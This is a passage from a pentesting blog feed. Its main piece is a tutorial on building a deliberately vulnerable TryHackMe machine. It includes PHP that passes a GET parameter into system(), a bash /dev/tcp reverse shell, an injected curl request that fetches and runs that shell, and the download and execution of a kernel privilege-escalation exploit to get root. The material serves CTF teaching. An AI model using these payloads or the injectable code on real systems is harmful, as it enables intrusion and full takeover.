nc ip port and it should work absolutely fine. There is a lot more that could have been explored with this- for example before I got to the actual solution I spent way too much time trying to debug using R2 and (attempting to) read the assmelby of some random functions- with varying results lol. The binary itself is quite big- in fact if you run strings on it, you will see a ton of random information- I actually still don‚Äôt know why a lot of it was in there, maybe to mess with more experienced binexp people (not that I‚Äôm one lmao) who are used to immeditaley opening the binary, and then debugging until they understand it enough to craft an exploit. But yeah, I‚Äôm not amazing at binexp- in fact it‚Äôs probably my worst area of cyber. This challenge was less about in depth, low-level binary exploitation, and more about how to approach a challenge. Anyway, I hope this writeup has helped :) -JamBot</summary></entry><entry><title type="html">Creating Boot2Root (HTB machines and tryhackme! rooms) challenges!</title><link href="http://localhost:4000/blog/Boot2Root-creation" rel="alternate" type="text/html" title="Creating Boot2Root (HTB machines and tryhackme! rooms) challenges!" /><published>2020-11-09T00:00:00+00:00</published><updated>2020-11-09T00:00:00+00:00</updated><id>http://localhost:4000/blog/create-boot2root</id><content type="html" xml:base="http://localhost:4000/blog/Boot2Root-creation">&lt;p&gt;Edit: Thankyou sm to the people who used this to create their own CTF challenges! I‚Äôve had a few people on discord talk to me about the exact same problem I had of not having enough resources- vagrant is nice but it‚Äôs so much easier just to design a vm in vmware then export as OVA&lt;/p&gt;

&lt;p&gt;Hello! So recently I‚Äôve been doing a lot more boot2root challenges. I decided I want to start making some of my own challenges as I want to create tryhackme rooms, HTB machines and my own deployable virtual network that makes it easy to play around with different types of vulnerabilities and teach people about common (and not so common) CVE‚Äôs and pentesting techniques- also how to defend against them. After this I spent a while looking for some nice guides on it but couldn‚Äôt really find anything that went in depth? Anyways - here‚Äôs a tutorial on how to make vulnerable VM‚Äôs, and deploy them on &lt;a href=&quot;https://tryhackme.com&quot;&gt;tryhackme&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;As this is just a tutorial, the machine made here will be quite basic and will not be made public :)&lt;/p&gt;

&lt;h2 id=&quot;firstly&quot;&gt;Firstly&lt;/h2&gt;

&lt;p&gt;While making machines I personally prefer to use VMware workstation and just their trial of pro. This is avaIlable for both linux and windows &lt;a href=&quot;https://www.vmware.com/uk/products/workstation-pro/workstation-pro-evaluation.html&quot;&gt;here&lt;/a&gt; &lt;del&gt;(if you need pro I‚Äôm sure you can find a way to acquire it)&lt;/del&gt;. Any software that can create virtual machines and export as an OVA/OVF file is fine though&lt;/p&gt;

&lt;p&gt;Also, uh system requirements. It goes without saying that if you want to create virtual machines, if you only have 4GB of RAM and you have to allocate all of that to the VM just to test, you‚Äôre gonna have a tough time. If you do have a potato PC however, don‚Äôt worry! There are linux distributions such as ubuntu server, that by default ship without a GUI and run perfectly fine on 1/2 GB of RAM and a single core. Older versions of windows such as XP run well on VMs even on lower end systems too. If you‚Äôre unsure of system requirements, just research a bit, a quick google search normally gets you what you‚Äôre looking for&lt;/p&gt;

&lt;h2 id=&quot;chossing-our-os&quot;&gt;Chossing our OS&lt;/h2&gt;

&lt;p&gt;Okay so this is fairly simple- we‚Äôre just picking what operating system we want our vm to be running. In my case I‚Äôm going to choose &lt;a href=&quot;https://releases.ubuntu.com/14.04/&quot;&gt;ubuntu 14.04&lt;/a&gt; because&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;
    &lt;p&gt;I already have it downloaded lol&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;By default this version of ubuntu (non server version) runs linux 3.13.0 which has a fairly easy to execute privilege escelation vulnerability. If you want to use another operating system and1. want to know what known kernel exploits there are, simply do:&lt;/p&gt;

    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; test@ubuntu:~$ uname -a
 Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64x86_64 GNU/       Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
  &lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Or, if you aren‚Äôt sure how to set up VM‚Äôs so that you can run commands, go to the next step then come back here :)&lt;/p&gt;

&lt;p&gt;So as you can see our kernel version is 3.13.0. We can check this for an exploit using &lt;a href=&quot;https://www.exploit-db.com/documentation/Offsec-SearchSploit.pdf&quot;&gt;searchsploit&lt;/a&gt; like so:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~/Desktop/projects/test$ searchsploit -t linux 3.13.0 privilege -s
-----------------------------------------------------------------------------------------------------   ---------- ------------------------ ---------------------------------
 Exploit        Title                                                                                                                              |  Path
-----------------------------------------------------------------------------------------------------   ---------- ------------------------ ---------------------------------
Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege       Escalation                                   | linux/local/37292.c
Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation    (Access /  etc/shadow)              | linux/local/37293.txt
-----------------------------------------------------------------------------------------------------   ---------- ------------------------ ---------------------------------
Shellcodes: No Results
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, we have an exploit. It‚Äôs always important to check that the exploits you intend to work.. well, work. But before we do that let‚Äôs make a virtual machine and get stuff up and running!&lt;/p&gt;

&lt;h2 id=&quot;making-the-vm&quot;&gt;Making the VM&lt;/h2&gt;

&lt;p&gt;This is probably the easiest part :)&lt;/p&gt;

&lt;p&gt;Let‚Äôs open up vmware workstation, and click &lt;code class=&quot;highlighter-rouge&quot;&gt;file -&amp;gt; new virtual machine -&amp;gt; typical&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/test-vm.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After this, we‚Äôre just gonna click next, choose our username &amp;amp; password, and assign however much storage space will be needed. You likely won‚Äôt need any more than 10gb here. The process of creating a VM is fairly straight forward.&lt;/p&gt;

&lt;p&gt;Epic, now let‚Äôs boot- and see what happens :)&lt;/p&gt;

&lt;p&gt;So, eventually ubuntu should boot- and you should see it copying files and installing. After all that is done you‚Äôll be greeted with the login screen!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/ubuntulogin.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Epic, now it‚Äôs as simple as making whatever changes we want (i.e. adding vulnerable services etc) then exporting the OVA file.&lt;/p&gt;

&lt;h2 id=&quot;adding-vulnerable-services&quot;&gt;Adding &lt;del&gt;vulnerable&lt;/del&gt; service(s).&lt;/h2&gt;

&lt;p&gt;These can be whatever you want, custom made web applications, SSH servers, FTP, or literally anything else you can think of. In our example I‚Äôm going to create an apache server running some PHP that leaves the server vulnerable to a command injection vulnerability. Expect some cooler stuff from future boxes that I make public - this is just an example :)&lt;/p&gt;

&lt;p&gt;So, you‚Äôre probably gonna need to install some packages, for example I needed to install the &lt;code class=&quot;highlighter-rouge&quot;&gt;apache2&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;php5-cli&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;libapache2-mod-php5&lt;/code&gt; packages. This means you‚Äôre gonna need root access to use the apt package manager, so remember your passwords lol.&lt;/p&gt;

&lt;p&gt;Now I‚Äôm gonna start the apache service, then check that it is in fact running:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;test@ubuntu:~$ sudo service apache2 start
 * Starting web server apache2                                                   * 
test@ubuntu:~$ sudo service apache2 status
 * apache2 is running
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great, now let‚Äôs get rid of the default &lt;code class=&quot;highlighter-rouge&quot;&gt;index.html&lt;/code&gt; file in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html&lt;/code&gt; directory. And instead replace it with &lt;code class=&quot;highlighter-rouge&quot;&gt;index.php&lt;/code&gt;. So if apache is now configured to run PHP, if we insert the following code into index.php, it should allow us to perform a basic exploit.&lt;/p&gt;

&lt;div class=&quot;language-php highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;to create a file, do GET /index.php?file=filename&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'file'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;system&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;touch &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$file&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;cp&quot;&gt;?&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So as you can see, if we perform a &lt;code class=&quot;highlighter-rouge&quot;&gt;GET&lt;/code&gt;request to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://ip_addr/index.php?filename=file&lt;/code&gt; then in the &lt;code class=&quot;highlighter-rouge&quot;&gt;/var/www/html/&lt;/code&gt; directory, a file with the name we supplied will be created.&lt;/p&gt;

&lt;video controls=&quot;&quot; width=&quot;320&quot; height=&quot;400&quot;&gt;
    &lt;source src=&quot;https://jambot3000.github.io/assets/videos/phpworks.mp4&quot; /&gt;
&lt;/video&gt;

&lt;h2 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h2&gt;

&lt;p&gt;So, the exploit here, as most pentesters would immediately see, is that the php code passes our input into a system command. This is bad because we can escape the &lt;code class=&quot;highlighter-rouge&quot;&gt;touch&lt;/code&gt; part of the command, by leaving a random filename after the &lt;code class=&quot;highlighter-rouge&quot;&gt;?file=&lt;/code&gt; followed by either a &lt;code class=&quot;highlighter-rouge&quot;&gt;;&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;%26%26&lt;/code&gt; (urlencoded &amp;amp;&amp;amp;) and a few other things.&lt;/p&gt;

&lt;p&gt;This works because on unix bases systems, a semicolon is the same as saying ‚Äúafter this has executed, even if I fail, go straight to the next thing‚Äù. &lt;code class=&quot;highlighter-rouge&quot;&gt;&amp;amp;&amp;amp; &lt;/code&gt;is a bit different, because the next command is only executed if the first one succeeds.&lt;/p&gt;

&lt;p&gt;Here is the &lt;strong&gt;intended&lt;/strong&gt; way of doing this machine:&lt;/p&gt;

&lt;h3 id=&quot;reverse-shell&quot;&gt;Reverse Shell&lt;/h3&gt;

&lt;p&gt;First we are going to want to get access to the machine properly. Right now we can execute commands but it will be easier to navigate the filesystem with a real shell. So, let‚Äôs set up our listener- I chose to use &lt;a href=&quot;https://github.com/cytopia/pwncat&quot;&gt;pwncat&lt;/a&gt; which was talked about in a THM &lt;a href=&quot;https://jambot3000.github.io/blog/THM-0day-writeup&quot;&gt;writeup&lt;/a&gt; of mine. Netcat or a variety of other tcp clients could have been used for this.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:~$ pwncat -l 1234 --self-inject /bin/bash:192.168.0.13:1234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay cool, so there are a few ways we can get access via a shell now. I‚Äôm going to create a bash script, containing a reverse shell, and then host that file on a http server. After that I‚Äôll send a command to the server, telling it to get that file, make it executable, then run it.&lt;/p&gt;

&lt;p&gt;My bash script looks like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
bash &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/192.168.0.13/1234 0&amp;gt;&amp;amp;1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Here‚Äôs how to host it while in the same directory as the bash script:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ sudo python -m SimpleHTTPServer 1000
Serving HTTP on 0.0.0.0 port 1000 ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, now let‚Äôs make a curl command to do what we want, here‚Äôs what worked for me:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ curl &quot;http://172.16.44.130?file=/nothing;wget%20http://192.168.0.13:1000/   revshell.sh%20-O%20oof.sh;chmod%20-R%20777%20oof.sh;./oof.sh&quot;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let‚Äôs analyze this. First, the parameter for &lt;code class=&quot;highlighter-rouge&quot;&gt;file&lt;/code&gt; supplied is &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt;. This can actually be anything starting with &lt;code class=&quot;highlighter-rouge&quot;&gt;/&lt;/code&gt; because the &lt;code class=&quot;highlighter-rouge&quot;&gt;www-data&lt;/code&gt; user doesn‚Äôt have permission to change anything in the root directory. I just done &lt;code class=&quot;highlighter-rouge&quot;&gt;/dev/null&lt;/code&gt; because anything passed to that is discarded. Next we can see it does a wget command &lt;code class=&quot;highlighter-rouge&quot;&gt;wget http://192.168.0.13:1000/revshell.sh -O oof.sh&lt;/code&gt;. The &lt;code class=&quot;highlighter-rouge&quot;&gt;%20&lt;/code&gt;‚Äôs just shows that there is a space there, because you can‚Äôt have spaces in URL‚Äôs.&lt;/p&gt;

&lt;p&gt;After this, we can see it does the command &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod -R 777 oof.sh&lt;/code&gt;. This makes the file we just downloaded executable, readable, and writeable, by all users- normally to make a file executable we do &lt;code class=&quot;highlighter-rouge&quot;&gt;chmod +x&lt;/code&gt; but that didn‚Äôt seem to work for some. Finally- it executes it, simply with &lt;code class=&quot;highlighter-rouge&quot;&gt;./oof.sh&lt;/code&gt;. So, let‚Äôs do this and see what happens.&lt;/p&gt;

&lt;p&gt;First, we can see that a request was successfully sent to our server.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ sudo python -m SimpleHTTPServer 1000
Serving HTTP on 0.0.0.0 port 1000 ...
192.168.0.13 - - [11/Nov/2020 07:40:03] &quot;GET /revshell.sh HTTP/1.1&quot; 200 -
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Great, next we know it made it executable and ran it, because pwncat started doing it‚Äôs thing.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ pwncat -l 1234 --self-inject /bin/bash:192.168.0.13:1234
[PWNCAT CnC] Checking if remote sends greeting...
[PWNCAT CnC] Checking if remote sends prefix/suffix to every request...
[PWNCAT CnC] Remote does not send prefix
[PWNCAT CnC] Probing for: which python3
[PWNCAT CnC] Potential path: /usr/bin/python3
[PWNCAT CnC] Found valid Python3 version: 3.4.0
...
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Uploading: /home/jambot/.local/bin/pwncat -&amp;gt; /tmp/tmps1_786_b (1/1)
[PWNCAT CnC] Flushing receive buffer done.
[PWNCAT CnC] Decoding: /tmp/tmps1_786_b -&amp;gt; /tmp/tmpmyb6f2gn
Starting pwncat rev shell: nohup /usr/bin/python3 /tmp/tmpmyb6f2gn 192.168.0.13 1234 --exec /bin/bash --reconn --reconn-wait 1 &amp;gt; /tmp/  tmp076nqpbs 2&amp;gt; /tmp/tmpyanlgsl8 &amp;amp;
[PWNCAT CnC] Waiting for socket
[PWNCAT CnC] Done. Handing over to current shell.
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, now we have a shell. Now even if we accidently exit our shell we can get it back like this:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ pwncat -l 1234 -vv
INFO: Listening on :::1234 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:1234 (family 2/IPv4, TCP)
INFO: Client connected from 192.168.0.13:43877 (family 2/IPv4, TCP)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let‚Äôs see who we are:&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python -c &quot;import pty;pty.spawn('/bin/bash')&quot;
www-data@ubuntu:/var/www/html$ whoami
www-data
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Epic, so hopefully we should be privileged enough to see the user account files.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/var/www/html$ cd /home
www-data@ubuntu:/home$ ls
test 
www-data@ubuntu:/home$ cd test
cd test
www-data@ubuntu:/home/test$ cd Desktop
www-data@ubuntu:/home/test/Desktop$ ls 
YES.MD	sudo  user.txt
www-data@ubuntu:/home/test/Desktop$ cat user.txt
cat user.txt
THM{REDACTED}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, that‚Äôs user done.&lt;/p&gt;

&lt;h2 id=&quot;privesc&quot;&gt;Privesc&lt;/h2&gt;

&lt;p&gt;Now, some easy privesc:&lt;/p&gt;

&lt;p&gt;First, before we use some enumeration script let‚Äôs just go back to basics and see what we can run as root- and what kernel version we‚Äôre running.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ sudo -l
[sudo] password for www-data:
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Rip, we do not have a password so we can‚Äôt run anything as sudo without password for www-data. Next let‚Äôs check what kernel version this system is on.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;So as we can see this appears to be running an old kernel version. Let‚Äôs see if exploitdb has anything on this using searchsploit.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ searchsploit ubuntu 3.13.0
---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
Exploit Title                                                                                                                         |    Path
---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                   |    linux/local/37292.c
Linux Kernel 3.13.0 &amp;lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)              |    linux/local/37293.txt
Linux Kernel 3.4 &amp;lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                 |    linux_x86-64/local/31347.c
Linux Kernel 3.4 &amp;lt; 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                        |    linux/local/31346.c
Linux Kernel 4.10.5 / &amp;lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                   |    linux/dos/43234.c
Linux Kernel &amp;lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                          |    linux/local/45010.c
Linux Kernel &amp;lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                 |    linux/local/44298.c
Linux Kernel &amp;lt; 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                      |    linux_x86-64/local/44300.c
Linux Kernel &amp;lt; 4.4.0-83 / &amp;lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                  |    linux/local/43418.c
Linux Kernel &amp;lt; 4.4.0/ &amp;lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)              |    linux/local/47169.c
Ubuntu &amp;lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                 |    linux/local/41760.txt
---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
Shellcodes: No Result
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Awesome, so there is quite a bit here. The one that looks most likely to work here is just the top one- so let‚Äôs download, compile, and run. :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;jambot@dishwasher:/tmp/oof$ cat /opt/exploitdb/exploits/linux/local/37292.c &amp;gt; exploit.c
jambot@dishwasher:/tmp/oof$ sudo python3 -m http.server 1000
Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, now from our shell let‚Äôs download this file we are now serving, compile, and run. (the IP I download from may change, because I‚Äôve worked on this from both school and at home, so it changes).&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;www-data@ubuntu:/tmp$ wget http://10.41.205.30:1000/exploit.c &amp;amp;&amp;amp; gcc exploit.c -o oof &amp;amp;&amp;amp; chmod +x oof;./oof

Awesome, so with this, we downloaded our file, compiled it, made the created binary executable, and then ran it, and‚Ä¶

--2020-11-12 04:31:58--  http://10.41.205.30:1000/exploit.c
Connecting to 10.41.205.30:1000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5119 (5.0K) [text/plain]
Saving to: 'exploit.c'

100%[======================================&amp;gt;] 5,119       --.-K/s   in 0s      

2020-11-12 04:31:58 (163 MB/s) - 'exploit.c' saved [5119/5119]

spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice! Now we‚Äôre root :)&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;# cd /root
# ls
root.txt
# cat root.txt
THM{REDACTED}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Epic, and there we have it, we‚Äôve succesfully created a basic vulnerable virtual machine, and proved that we can actually break into it. So now what?&lt;/p&gt;

&lt;h2 id=&quot;deploying-to-thm&quot;&gt;Deploying to THM&lt;/h2&gt;

&lt;p&gt;Okay so finally, here‚Äôs how to deploy to THM. Tryhack me have an awesome interface for deploying rooms that make it super simple to get started. First however, we‚Äôre going to want to export our virtual machine to an appropriate format. OVA is one of the accepted formats, so let‚Äôs do that:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/export-to-ova.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;So after exporting hopefully we should have our OVA file saved somewhere. Now we can actually create the room.&lt;/p&gt;

&lt;p&gt;Head over to &lt;a href=&quot;https://tryhackme.com/upload&quot;&gt;https://tryhackme.com/upload&lt;/a&gt; (you may need to enable develop options to do this.) And now we‚Äôre going to import our OVA file, so that we can create a room, and use it in that room.&lt;/p&gt;

&lt;p&gt;Next you‚Äôre going to want to go to &lt;a href=&quot;https://tryhackme.com/create-room]&quot;&gt;https://tryhackme.com/create-room&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/thm-create-room.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After we have created the room, we‚Äôre going to want to assign tasks, by going &lt;a href=&quot;https://tryhackme.com/assign-tasks&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/assign-tasks-1.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Awesome, so the vm you uploaded should be the one you choose (mine was called ‚Äútest‚Äù in this case). Then, because I had a user and root flag, I‚Äôm going to add 2 questions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/thm-questions.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After that, just hit the ‚Äúcreate task‚Äù button :)&lt;/p&gt;

&lt;p&gt;Now, if you want to make your room public, you can go to &lt;a href=&quot;https://tryhackme.com/manage-rooms&quot;&gt;https://tryhackme.com/manage-rooms&lt;/a&gt; and select the room of your choice.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://jambot3000.github.io/assets/images/public-room.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now, if you want to test your room, to verify that it is 100% working, simply use your own roomcode to access your room- and then atack the vm as you would in any other room :)&lt;/p&gt;

&lt;p&gt;That‚Äôs all, I hope this helped anyone learning how to make THM rooms :)&lt;/p&gt;</content><author><name>JamBot</name></author><category term="thm" /><category term="pentesting" /><category term="tutorial" /><summary type="html">Edit: Thankyou sm to the people who used this to create their own CTF challenges! I‚Äôve had a few people on discord talk to me about the exact same problem I had of not having enough resources- vagrant is nice but it‚Äôs so much easier just to design a vm in vmware then export as OVA</summary></entry><entry><title type="html">Tryhackme! 0day writeup</title><link href="http://localhost:4000/blog/THM-0DAY-writeup" rel="alternate" type="text/html" title="Tryhackme! 0day writeup" /><published>2020-11-05T00:00:00+00:00</published><updated>2020-11-05T00:00:00+00:00</updated><id>http://localhost:4000/blog/THM-0DAY</id><content type="html" xml:base="http://localhost:4000/blog/THM-0DAY-writeup">&lt;h1 id=&quot;explanation&quot;&gt;Explanation&lt;/h1&gt;

&lt;p&gt;No! I didn‚Äôt find a 0day vuln in tryhackme. This is the name of an awesome easy linux room made by &lt;a href=&quot;https://tryhackme.com/p/MuirlandOracle&quot;&gt;MuirlandOracle&lt;/a&gt; and &lt;a href=&quot;https://tryhackme.com/p/0day&quot;&gt;0day(ryan)&lt;/a&gt;. This is the first public CTF writeup I‚Äôm doing so I figured I might aswell make the first one an easy machine. I‚Äôll probably make one or more of these per we   ek, HTB is more fiddly because I have to wait until the box retires, but I definitely will be doing some HTB stuff :). Maybe I could implement a system to check if the box is retired, and if not then you will be required the enter the flags to view it. Github pages doesn‚Äôt allow for backend though so uh idk. Anyhow, to maximise the chances of someone learning something from this- I won‚Äôt be doing a walkthrough, instead more of an investigation/report, in which I cover everything I found, and elaborate what could have been used under different circumstances.&lt;/p&gt;

&lt;h1 id=&quot;setup&quot;&gt;Setup&lt;/h1&gt;

&lt;p&gt;As this is the first THM writeup, I‚Äôll explain how to connect to the vpn, and get started on a machine. I won‚Äôt be doing this for all writeups, this is just something for people maybe new to CTF/pentesting stuff who might wanna follow along :)&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;NOTE:&lt;/strong&gt; Blogs are normally made over a few days, so for THM the IP address referenced may vary.&lt;/p&gt;

